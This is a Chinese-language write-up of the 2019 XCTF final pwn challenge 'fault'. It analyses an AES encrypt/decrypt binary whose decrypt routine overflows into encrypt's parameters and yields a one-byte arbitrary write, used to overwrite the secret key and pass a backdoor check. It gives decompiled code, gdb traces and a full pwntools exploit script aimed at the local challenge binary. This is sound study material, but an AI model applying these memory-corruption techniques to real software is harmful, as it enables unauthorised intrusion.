
# 2019 xctf final fault writeup


                                阅读量   
                                **137000**
                            
                        |
                        
                                                                                    



[![](./img/245798/t0178d83e5a3e339ac3.png)](./img/245798/t0178d83e5a3e339ac3.png)



## 前言

这道题目也是困惑了我好久，起初是看不懂程序功能逻辑，然后是看懂了逻辑找不到程序漏洞点在哪里，分析了良久，终于找到可疑点（程序解密的时候输入数据长度过长），此程序是一个AES加解密的程序，程序有一个后门函数，条件是要让输入的值等于程序起初随机生成的AES的key。经过艰辛的调试，终于弄明白题目如何去覆盖在bss段的key，从而使得满足条件，拿到flag。下面就开始分析一下我调试的过程以及覆盖的方法。



## 题目功能分析

题目main函数：

```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax

  sub_15DA();
  init_rand();
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v3 = (char)sub_18F1();
        if ( (char)v3 != 'd' )
          break;
        dec();
      }
      if ( v3 &gt; 'd' )
        break;
      if ( v3 != 'c' )
        goto LABEL_13;
      check();                                  // rsa 加密rand
    }
    if ( v3 != 'e' )
      break;
    enc();
  }
  if ( v3 == 's' )
    shell();                                    // 需要rand值
LABEL_13:
  puts("wrong option");
  return 0LL;
}
```

题目保护全开，程序有以下几个功能：

1.encrypt 加密。AES-128加密。不同于原来的AES，这里的AES加密函数多了两个参数arg1,arg2，作用是在AES加密的第8轮时，堆input的矩阵input[arg1] ^=arg2。正常加密时这两个参数是0，则不影响加密结果。

```
scanf("%32s", v2);
getchar();
str2hex((__int64)v2, (__int64)&amp;input, 32);    // input --&gt;2053d0  字符变hex数字
v1 = sub_2E31(16LL);                          // malloc 44*4
key_extension((__int64)&amp;rand, (__int64)v1);
AES((__int64)&amp;input, (__int64)&amp;output, (__int64)v1, byte_205440, byte_205441);
printf02x((__int64)&amp;output, 16);
```

```
sub_22FF((__int64)v16, rand_1, 0);            // addRoundKeys
for ( k = 1; k &lt; dword_20545C; ++k )
{
 if ( k == 8 )
   v16[v7] ^= v8;                            // --&gt;key point  越界写一个字节，修改output地址为rand地址，可实现将key覆盖为密文输出
 sub_2886((__int64)v16);                     // subBytes
 sub_26B5((__int64)v16);                     // shiftRows
 sub_24B9((__int64)v16);                     // MixColumns
 sub_22FF((__int64)v16, rand_1, k);          // addRoundKeys
}
sub_2886((__int64)v16);
sub_26B5((__int64)v16);
sub_22FF((__int64)v16, rand_1, dword_20545C);
```

2.decrypt解密。漏洞关键点，输入密文为64位，比预期大了32位，因此在解密后可能覆盖后面加密的两个参数arg1，arg2为任意值，由此可以通过encrypt函数的抑或来实现末位一字节写。

```
scanf("%64s", s);                             // encdata
getchar();
putchar('&gt;');
scanf("%32s", v4);                            // rand_key
getchar();
```

3.check 检查函数。对题目没帮助，只是提供checker检查方便。

4.shell 后门shell。只有输入的数据和程序bss段上的key相同时，才会输出flag。

```
scanf("%32s", v4);
sub_177C(v5, (__int64)&amp;rand, 16);
for ( i = 0; i &lt;= 31; ++i )
{
 if ( v4[i] != v5[i] )                       // 需要泄露rand内容，或者修改rand
   exit(0);
}
std::ifstream::basic_ifstream(v3, "/flag", 8LL);
```



## 漏洞点

1.decrypt函数存在解密后数据溢出漏洞，可覆盖栈中的arg1、arg2参数

2.encrypt函数存在下标溢出漏洞，可实现栈中数据任意一字节写。



## 利用

1.明文加密一次

2.解密一次,使用0x20覆盖加密函数的两个参数（此处用0x20是因为在栈上和input地址相差0x20的地方的地址指向的是output的地址，由此可以实现将output地址的最后一个字节改写成rand地址）<br>
bss段布局如下：

```
.bss:00000000002053C0 randkey            db    ? ;               ; DATA XREF: init_rand+45↑o
.bss:00000000002053C0                                         ; sub_16BC+23↑o ...
.bss:00000000002053C1                 db    ? ;
.bss:00000000002053C2           ..............................................
.bss:00000000002053CF                 db    ? ;
.bss:00000000002053D0 input           db    ? ;               ; DATA XREF: sub_16BC+4E↑o
.bss:00000000002053D0                                         ; enc+3D↑o ...
.bss:00000000002053D1                 db    ? ;
.bss:00000000002053D2      ...................................
.bss:00000000002053DF                 db    ? ;
.bss:00000000002053E0 output_enc      db    ? ;               ; DATA XREF: sub_16BC+47↑o
.bss:00000000002053E0                                         ; enc+8D↑o ...
.bss:00000000002053E1                 db    ? ;
.bss:00000000002053E2        ....................................
.bss:00000000002053FF                 db    ? ;
.bss:0000000000205400 input_randkey   db    ? ;               ; DATA XREF: dec+A7↑o
.bss:0000000000205400                                         ; dec+E9↑o
.bss:0000000000205401                 db    ? ;
.bss:0000000000205402        ..................................
.bss:000000000020540F                 db    ? ;
.bss:0000000000205410 input_enc       db    ? ;               ; DATA XREF: dec+BF↑o
.bss:0000000000205410                                         ; dec+139↑o
.bss:0000000000205411                 db    ? ;
.bss:0000000000205412              ........................................
.bss:000000000020542F                 db    ? ;
.bss:0000000000205430 output_dec      db    ? ;               ; DATA XREF: dec+125↑o
.bss:0000000000205430                                         ; dec+170↑o
.bss:0000000000205431                 db    ? ;
.bss:0000000000205432       ..............................
.bss:000000000020543F                 db    ? ;
.bss:0000000000205440 byte_205440     db ?                    ; DATA XREF: enc+77↑r
.bss:0000000000205441 byte_205441
```

3.再次使用相同明文加密,使得异或修改output_enc地址为rand地址,实现覆盖key为输出的密文,输出则为key

4.输入key,拿到flag



## 调试过程

1.先经过加密，初始化key和output_enc地址

2.解密，用0x20的密文解密生成明文0x20，去覆盖AES加密的参数为0x20，调试如下：

```
0x55d955061dc8                  mov    rdx, rax
   0x55d955061dcb                  lea    rsi, [rip+0x20360e]        # 0x55d9552653e0
   0x55d955061dd2                  lea    rdi, [rip+0x2035f7]        # 0x55d9552653d0
 → 0x55d955061dd9                  call   0x55d955062eaf   #AESenc
   ↳  0x55d955062eaf                  push   rbp
      0x55d955062eb0                  mov    rbp, rsp
      0x55d955062eb3                  push   r12
      0x55d955062eb5                  push   rbx
      0x55d955062eb6                  sub    rsp, 0x40
      0x55d955062eba                  mov    QWORD PTR [rbp-0x38], rdi
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
0x55d955062eaf (
   $rdi = 0x000055d9552653d0 → 0xf876b7f7f876b7f7,       # input
   $rsi = 0x000055d9552653e0 → 0x309596f547c8c6fc,       # output
   $rdx = 0x000055d955927da0 → 0xf8dfe8ebca9696bf,       # randkey(堆上的)
   $rcx = 0x0000000000000000       &lt;------------- arg1 arg2
)
```

可看到两个参数均为0，继续解密，输入64位密文，得到64位明文，覆盖掉output_dec下面的 arg1 arg2，覆盖成0x20：

```
gef➤  x/16gx 0x000055d955060000+0x205430  #output addr
0x55d955265430:    0x2020202020202020    0x2020202020202020
0x55d955265440:    0x2020202020202020 &lt;-- 0x2020202020202020 #arg1 arg2 overwrite to 0x20
```

3.再次加密，将output_enc地址最后一字节修改使其变成randkey地址，两者相差0x20，所以arg1 = 0x20（下标），arg2 = 0x20（亦或下标为0x20的数据，使其为0xc0），调试如下：

```
$rax   : 0xe0              
$rbx   : 0x00007ffdd2d2d060  →  0x00083620d2d2d220
$rcx   : 0xea              
$rdx   : 0x00007ffdd2d2d050  →  0x63b5b45642fb9bcd
$rsp   : 0x00007ffdd2d2d050  →  0x63b5b45642fb9bcd
$rbp   : 0x00007ffdd2d2d0b0  →  0x00007ffdd2d2d100  →  0x00007ffdd2d2d120  →  0x000055d955063340  →   push r15
$rsi   : 0xb2              
$rdi   : 0x00007ffdd2d2d050  →  0x63b5b45642fb9bcd
$rip   : 0x000055d955062ff4  →   movzx esi, BYTE PTR [rbp-0x50]
$r8    : 0x20              
$r9    : 0x10              
$r10   : 0x0               
$r11   : 0x10              
$r12   : 0x0               
$r13   : 0x00007ffdd2d2d200  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffdd2d2d050│+0x0000: 0x63b5b45642fb9bcd     ← $rdx, $rsp, $rdi
0x00007ffdd2d2d058│+0x0008: 0xb2dc1a7edbfbedc1
0x00007ffdd2d2d060│+0x0010: 0x00083620d2d2d220     ← $rbx
0x00007ffdd2d2d068│+0x0018: 0x000055d955927da0  →  0xf8dfe8ebca9696bf
0x00007ffdd2d2d070│+0x0020: 0x000055d9552653e0  →  0x309596f547c8c6fc
0x00007ffdd2d2d078│+0x0028: 0x000055d9552653d0  →  0xf876b7f7f876b7f7
0x00007ffdd2d2d080│+0x0030: 0x080404fdd2d2d0b0
0x00007ffdd2d2d088│+0x0038: 0x000000000000000f
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d955062fea                  mov    rdx, QWORD PTR [rbp-0x20]
   0x55d955062fee                  cdqe   
   0x55d955062ff0                  movzx  eax, BYTE PTR [rdx+rax*1] &lt;--下标为0x20的末位值：0xe0
 → 0x55d955062ff4                  movzx  esi, BYTE PTR [rbp-0x50]
   0x55d955062ff8                  xor    al, BYTE PTR [rbp-0x4c]
   0x55d955062ffb                  mov    ecx, eax
   0x55d955062ffd                  mov    rdx, QWORD PTR [rbp-0x20]
   0x55d955063001                  movsxd rax, esi
   0x55d955063004                  mov    BYTE PTR [rdx+rax*1], cl

gef➤ ni
$rax   : 0xc0              
$rbx   : 0x00007ffdd2d2d060  →  0x00083620d2d2d220
$rcx   : 0xea              
$rdx   : 0x00007ffdd2d2d050  →  0x63b5b45642fb9bcd
$rsp   : 0x00007ffdd2d2d050  →  0x63b5b45642fb9bcd
$rbp   : 0x00007ffdd2d2d0b0  →  0x00007ffdd2d2d100  →  0x00007ffdd2d2d120  →  0x000055d955063340  →   push r15
$rsi   : 0x20 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
  0x55d955062fee                  cdqe   
   0x55d955062ff0                  movzx  eax, BYTE PTR [rdx+rax*1]
   0x55d955062ff4                  movzx  esi, BYTE PTR [rbp-0x50]
 → 0x55d955062ff8                  xor    al, BYTE PTR [rbp-0x4c] &lt;--0xe0^0x20 = 0xc0
   0x55d955062ffb                  mov    ecx, eax
   0x55d955062ffd                  mov    rdx, QWORD PTR [rbp-0x20]
   0x55d955063001                  movsxd rax, esi
   0x55d955063004                  mov    BYTE PTR [rdx+rax*1], cl
   0x55d955063007                  mov    rax, QWORD PTR [rbp-0x20]
```

此时亦或完成，值为0xc0，接下来是赋值修改末位：

```
$rax   : 0x20              
$rbx   : 0x00007ffdd2d2d060  →  0x00083620d2d2d220
$rcx   : 0xc0              
$rdx   : 0x00007ffdd2d2d050  →  0x63b5b45642fb9bcd
$rsp   : 0x00007ffdd2d2d050  →  0x63b5b45642fb9bcd
$rbp   : 0x00007ffdd2d2d0b0  →  0x00007ffdd2d2d100  →  0x00007ffdd2d2d120  →  0x000055d955063340  →   push r15
$rsi   : 0x20              
$rdi   : 0x00007ffdd2d2d050  →  0x63b5b45642fb9bcd
$rip   : 0x000055d955063004  →   mov BYTE PTR [rdx+rax*1], cl
$r8    : 0x20              
$r9    : 0x10              
$r10   : 0x0               
$r11   : 0x10              
$r12   : 0x0               
$r13   : 0x00007ffdd2d2d200  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d955062ffb                  mov    ecx, eax
   0x55d955062ffd                  mov    rdx, QWORD PTR [rbp-0x20]
   0x55d955063001                  movsxd rax, esi
 → 0x55d955063004                  mov    BYTE PTR [rdx+rax*1], cl
   0x55d955063007                  mov    rax, QWORD PTR [rbp-0x20]
   0x55d95506300b                  mov    rdi, rax
   0x55d95506300e                  call   0x55d955062886
   0x55d955063013                  mov    rax, QWORD PTR [rbp-0x20]
   0x55d955063017                  mov    rdi, rax
```

rdx为input数据，将input数据的下表为0x20位置修改成c0，可看一下原来[rdx+rax*1]位置是output_enc地址0x000055d9552653e0 ，将其变为randkey地址0x000055d9552653c0，即可实现覆盖randkey为加密后密文，如下：

```
gef➤  x/8gx $rdx+$rax*1
0x7ffdd2d2d070:    0x000055d9552653e0 &lt;--output_enc    0x000055d9552653d0
0x7ffdd2d2d080:    0x080404fdd2d2d0b0    0x000000000000000f
0x7ffdd2d2d090:    0x00007ffdd2d2d050    0x85ee5cecedfbab00
0x7ffdd2d2d0a0:    0x0000000000000000    0x000055d9550614d0
gef➤  ni
gef➤  x/8gx $rdx+$rax*1
0x7ffdd2d2d070:    0x000055d9552653c0 &lt;--randkey    0x000055d9552653d0
0x7ffdd2d2d080:    0x080404fdd2d2d0b0    0x000000000000000f
0x7ffdd2d2d090:    0x00007ffdd2d2d050    0x85ee5cecedfbab00
0x7ffdd2d2d0a0:    0x0000000000000000    0x000055d9550614d0
```

按照这个节奏，当加密函数运行完，在bss段的randkey会被写入密文，而输出则会将密文输出：

```
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d955061dcb                  lea    rsi, [rip+0x20360e]        # 0x55d9552653e0
   0x55d955061dd2                  lea    rdi, [rip+0x2035f7]        # 0x55d9552653d0
   0x55d955061dd9                  call   0x55d955062eaf            #AESenc
 → 0x55d955061dde                  mov    esi, 0x10
   0x55d955061de3                  lea    rdi, [rip+0x2035f6]        # 0x55d9552653e0
   0x55d955061dea                  call   0x55d955061725            # printf02x
   0x55d955061def                  nop    
   0x55d955061df0                  mov    rax, QWORD PTR [rbp-0x8]
   0x55d955061df4                  xor    rax, QWORD PTR fs:0x28
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/8gx 0x000055d9552653c0
0x55d9552653c0:    0x309596f547c8c6fc &lt;--    0x1c879b06cfc5a17e
0x55d9552653d0:    0xf876b7f7f876b7f7    0xd03e7ef9d0d0d0d0
0x55d9552653e0:    0x309596f547c8c6fc    0x1c879b06cfc5a17e
0x55d9552653f0:    0x0000000000000000    0x0000000000000000
gef➤  x/8gx 0x000055d9552653e0
0x55d9552653e0:    0x309596f547c8c6fc &lt;--    0x1c879b06cfc5a17e
0x55d9552653f0:    0x0000000000000000    0x0000000000000000
0x55d955265400:    0xbbbbbbbbbbbbbbbb    0xbbbbbbbbbbbbbbbb
0x55d955265410:    0x5d41f5d4cea95856    0x4064d479e8e2853e
```

randkey已经变成了密文。随后只要使用shell函数，输入密文即可获取flag。

```
'&gt;'
[*] aa6da6ca395fcab1ceda405ca27a0956
[DEBUG] Sent 0x2 bytes:
    's\n'
[DEBUG] Sent 0x22 bytes:
    'aa6da6ca395fcab1ceda405ca27a0956\n'
    '\n'
[*] Process './fault_bibi' stopped with exit code 0 (pid 106809)
[DEBUG] Received 0x16 bytes:
    'flag{1111111111111111}'
[*] flag{1111111111111111}
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```



## exp

```
from pwn import *

context.arch='amd64'
context.terminal = ['terminator','-x','sh','-c']
context.log_level = 'debug'
def cmd(command):
    p.recvuntil("&gt;",timeout=0.5)
    p.sendline(command)

def main():
    global p
    #p = remote(host,port)
    p = process("./fault_bibi")

        # debug(0x0000000000003004)
    cmd('e')
    #gdb.attach(p)
    p.sendline("cafebabedeadbeefcafebabedeadbeef".decode('hex'))
    cmd('d')
    payload1 = "5658a9ced4f5415d3e85e2e879d464405658a9ced4f5415d3e85e2e879d46440"
    payload2 = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"

    p.sendline(payload1)
    p.sendline(payload2)
    #gdb.attach(p)
    cmd('e')
    p.sendline("cafebabedeadbeefcafebabedeadbeef".decode('hex'))
    p.recvuntil("e:encryp",drop=True)
    p.recvuntil("&gt;")
    key = p.recvuntil("e:encryp",drop=True)
    info(key)
    cmd('s')
    p.sendline(key)
    flag = p.recv(timeout=0.5)
    info(flag)
    p.interactive()

if __name__ == "__main__":
    main()
```



## 总结

这道题目让我深刻的了解了AES加密算法的原理和c语言实现，题目巧妙地用一个栈溢出和一个亦或操作实现了一个字节的任意写，从而改变了bss段randkey的值，且在给定的参数为0条件下，亦或不影响正常的AES算法的值，当给定的参数非0，在不超过下标范围（0-0x10）内会影响AES结果，但超过下标范围会造成一个字节任意写。不愧是xctf final题目，学到了！
